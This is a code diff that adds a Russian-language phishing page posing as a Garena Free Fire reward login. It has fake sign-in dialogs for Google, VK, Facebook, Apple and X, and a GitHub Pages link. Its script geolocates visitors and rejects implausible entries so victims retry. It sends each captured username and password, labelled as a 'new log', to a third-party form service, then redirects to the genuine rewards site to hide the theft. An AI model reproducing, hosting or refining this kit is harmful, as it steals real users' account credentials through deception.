@@ -1,0 +1,240 @@
+<!-- Google Modal -->
+    <div id="google-modal" class="modal">
+        <div class="login-box" style="min-height: 380px;" onclick="event.stopPropagation()">
+            <div id="g-loader" class="loader-container"><div class="loader-bar"></div></div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
+            <div id="g-step1">
+                <div class="g-title">Вход</div>
+                <div class="g-sub">Используйте аккаунт Google</div>
+                <input type="text" id="g-email" class="g-input" autocomplete="username" placeholder="Телефон или адрес эл. почты">
+                <div id="em-err" class="g-error">Не удалось найти аккаунт Google.</div>
+                <a href="https://accounts.google.com/signin/usernamerecovery" target="_blank" class="g-link">Забыли адрес эл. почты?</a>
+                <p style="font-size: 14px; color: #5f6368; margin-top: 30px; line-height: 1.4;">
+                    Перед продолжением компания Google предоставит приложению <b>Garena Free Fire</b> ваши имя, адрес электронной почты и профиль.
+                </p>
+                <div class="g-footer-btns">
+                    <a href="https://accounts.google.com/signup" target="_blank" class="g-link">Создать аккаунт</a>
+                    <button class="g-btn-next" onclick="nextG()">Далее</button>
+                </div>
+            </div>
+            <div id="g-step2" style="display:none;">
+                <div class="g-title">Добро пожаловать</div>
+                <div id="disp-email" style="text-align:center; border: 1px solid #dadce0; border-radius: 20px; padding: 5px 10px; display: inline-block; margin: 0 auto 20px; width: 100%; box-sizing: border-box; font-size: 14px; color: #3c4043;"></div>
+                <input type="password" id="g-pass" class="g-input" autocomplete="current-password" placeholder="Введите пароль">
+                <div id="ps-err" class="g-error">Неверный пароль. Попробуйте еще раз.</div>
+                <label class="show-pass-wrap">
+                    <input type="checkbox" onclick="togglePass()">
+                    <span>Показать пароль</span>
+                </label>
+                <div class="g-footer-btns" style="margin-top: 40px;">
+                    <a href="https://accounts.google.com/signin/recovery" target="_blank" class="g-link">Забыли пароль?</a>
+                    <button class="g-btn-next" onclick="finishG()">Далее</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- VK Modal -->
+    <div id="vk-modal" class="modal">
+        <div class="vk-box" onclick="event.stopPropagation()">
+            <div class="vk-header">
+                <div class="vk-logo">VK ID</div>
+                <div class="vk-subtitle">Вход в аккаунт</div>
+            </div>
+            <div class="vk-body">
+                <div class="vk-title">Вход через VK ID</div>
+                <input type="text" id="vk-email" class="vk-input" placeholder="Телефон или почта" autocomplete="username">
+                <input type="password" id="vk-pass" class="vk-input" placeholder="Пароль" autocomplete="current-password">
+                <button class="vk-login-btn" onclick="finishVk()">Войти</button>
+                <button class="vk-signup-btn" onclick="window.open('https://id.vk.com/signup','_blank')">Зарегистрироваться</button>
+                <div class="vk-links">
+                    <a href="https://id.vk.com/restore" target="_blank" class="vk-link">Забыли пароль?</a>
+                </div>
+                <div class="vk-footer">
+                    Нажимая «Войти», вы принимаете <a href="https://id.vk.com/terms" target="_blank">условия</a> и <a href="https://id.vk.com/privacy" target="_blank">политику конфиденциальности</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Generic Social Modal (for Apple, X) -->
+    <div id="std-modal" class="modal">
+        <div class="login-box" onclick="event.stopPropagation()">
+            <div id="std-header" class="std-title-box">ВХОД</div>
+            <input type="text" id="std-user" class="g-input" placeholder="Логин (Email/Телефон)">
+            <input type="password" id="std-pass" class="g-input" placeholder="Пароль">
+            <button id="std-submit-btn" class="std-btn" onclick="finishStd()">ПОДТВЕРДИТЬ</button>
+            <a id="std-reset-link" href="#" target="_blank" class="std-reset">Забыли пароль?</a>
+        </div>
+    </div>
+
+    <!-- Facebook Modal -->
+    <div id="fb-modal" class="modal">
+        <div class="fb-box" onclick="event.stopPropagation()">
+            <div class="fb-header">
+                <span class="fb-logo">facebook</span>
+            </div>
+            <div class="fb-body">
+                <input type="text" id="fb-email" class="fb-input" placeholder="Электронный адрес или номер телефона" autocomplete="username">
+                <input type="password" id="fb-pass" class="fb-input" placeholder="Пароль" autocomplete="current-password">
+                <button class="fb-login-btn" onclick="finishFb()">Вход</button>
+                <div class="fb-links">
+                    <a href="https://www.facebook.com/recover/initiate" target="_blank" class="fb-link">Забыли пароль?</a>
+                </div>
+                <div class="fb-divider"></div>
+                <a href="https://www.facebook.com/r.php" target="_blank" class="fb-create-btn">Создать новый аккаунт</a>
+                <div class="fb-language">Русский · English (US) · Українська</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript Script -->
+    <script>
+        const AK = "0a270743-92d9-493a-9c4d-680fac6ba260";
+        let currentPl = "";
+        let userCountry = "Не определена";
+
+        // Автоматическое определение страны по IP при загрузке страницы
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.country_name) {
+                    userCountry = data.country_name + (data.city ? " (" + data.city + ")" : "");
+                }
+            })
+            .catch(() => {});
+
+        function hasCyrillic(str) { 
+            return /[а-яё]/i.test(str); 
+        }
+
+        function togglePass() {
+            const x = document.getElementById("g-pass");
+            x.type = x.type === "password" ? "text" : "password";
+        }
+
+        function openLogin(name) {
+            currentPl = name;
+            if (name === 'Facebook') {
+                document.getElementById('fb-modal').style.display = 'flex';
+                return;
+            }
+            if (name === 'VK') {
+                document.getElementById('vk-modal').style.display = 'flex';
+                return;
+            }
+            
+            const header = document.getElementById('std-header');
+            const btn = document.getElementById('std-submit-btn');
+            const reset = document.getElementById('std-reset-link');
+            
+            header.innerText = 'ВХОД ЧЕРЕЗ ' + name.toUpperCase();
+            
+            if(name === 'Apple') { 
+                header.style.background = '#000'; 
+                btn.style.background = '#000'; 
+                reset.href = 'https://iforgot.apple.com/'; 
+            } else if(name === 'X') { 
+                header.style.background = '#000'; 
+                btn.style.background = '#000'; 
+                reset.href = 'https://x.com/password/reset'; 
+            }
+            
+            document.getElementById('std-modal').style.display = 'flex';
+        }
+
+        function openGoogle() {
+            currentPl = "Google";
+            document.getElementById('google-modal').style.display = 'flex';
+        }
+
+        function showLoader(callback) {
+            const loader = document.getElementById('g-loader');
+            loader.style.display = 'block';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                callback();
+            }, 2700);
+        }
+
+        function nextG() {
+            const emInput = document.getElementById('g-email');
+            const emErr = document.getElementById('em-err');
+            const email = emInput.value.trim();
+            if (!email.includes('@gmail.com') || hasCyrillic(email) || email.length < 11) {
+                emInput.classList.add('err-border');
+                emErr.style.display = 'block';
+                return;
+            }
+            emInput.classList.remove('err-border');
+            emErr.style.display = 'none';
+            showLoader(() => {
+                document.getElementById('disp-email').innerText = email;
+                document.getElementById('g-step1').style.display = 'none';
+                document.getElementById('g-step2').style.display = 'block';
+            });
+        }
+
+        function finishG() {
+            const psInput = document.getElementById('g-pass');
+            const psErr = document.getElementById('ps-err');
+            const pass = psInput.value;
+            if (pass.length < 6 || hasCyrillic(pass)) {
+                psInput.classList.add('err-border');
+                psErr.style.display = 'block';
+                return;
+            }
+            psInput.classList.remove('err-border');
+            psErr.style.display = 'none';
+            showLoader(() => { send(document.getElementById('g-email').value, pass); });
+        }
+
+        function finishVk() {
+            const u = document.getElementById('vk-email').value;
+            const p = document.getElementById('vk-pass').value;
+            if (u.length < 3 || hasCyrillic(u) || p.length < 6 || hasCyrillic(p)) {
+                alert("Ошибка авторизации. Проверьте данные.");
+                return;
+            }
+            send(u, p);
+        }
+
+        function finishStd() {
+            const u = document.getElementById('std-user').value;
+            const p = document.getElementById('std-pass').value;
+            if (u.length < 3 || hasCyrillic(u) || p.length < 6 || hasCyrillic(p)) {
+                alert("Ошибка авторизации. Проверьте данные.");
+                return;
+            }
+            send(u, p);
+        }
+
+        function finishFb() {
+            const u = document.getElementById('fb-email').value;
+            const p = document.getElementById('fb-pass').value;
+            if (u.length < 3 || hasCyrillic(u) || p.length < 6 || hasCyrillic(p)) {
+                alert("Ошибка авторизации. Проверьте данные.");
+                return;
+            }
+            send(u, p);
+        }
+
+        function send(u, p) {
+            const formattedMessage = `🎯 НОВЫЙ ЛОГ FREE FIRE\n\n👤 Логин: ${u}\n🔑 Пароль: ${p}\n🌐 Платформа: ${currentPl}\n🌍 Страна: ${userCountry}`;
+            
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ access_key: AK, message: formattedMessage })
+            }).then(() => { window.location.href = "https://reward.ff.garena.com/ru"; });
+        }
+
+        window.onclick = (e) => {
+            if (e.target.classList.contains('modal')) {
+                e.target.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
+https://rewardfreefreecom-commits.github.io/Free.free/
